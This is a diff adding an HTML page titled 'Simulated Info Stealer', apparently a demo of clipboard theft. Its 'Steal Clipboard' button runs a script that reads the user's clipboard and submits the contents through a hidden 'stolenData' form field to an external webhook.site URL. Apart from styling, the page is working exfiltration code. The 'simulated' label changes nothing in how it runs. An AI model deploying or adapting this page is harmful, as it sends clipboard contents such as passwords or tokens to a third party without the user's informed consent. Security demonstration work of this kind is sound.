@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Simulated Info Stealer – Form POST</title>
+  <style>
+    body {
+      background-color: #1a1a2e;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    h1 {
+      color: #FF4C4C;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      background-color: #cc0000;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background-color: #ff4c4c;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <h1>Simulated Info Stealer via Form POST</h1>
+  <button onclick="stealClipboard()">🚨 Steal Clipboard</button>
+
+  <form id="stealerForm" method="POST" action="https://webhook.site/12c74b14-80e6-4bce-9678-184713c0058c" target="_blank">
+    <input type="hidden" name="stolenData" id="stolenData" />
+  </form>
+
+  <script>
+    async function stealClipboard() {
+      try {
+        const data = await navigator.clipboard.readText();
+        document.getElementById("stolenData").value = data;
+        document.getElementById("stealerForm").submit();
+      } catch (err) {
+        alert("❌ Failed to read clipboard: " + err);
+      }
+    }
+  </script>
+</body>
+</html>
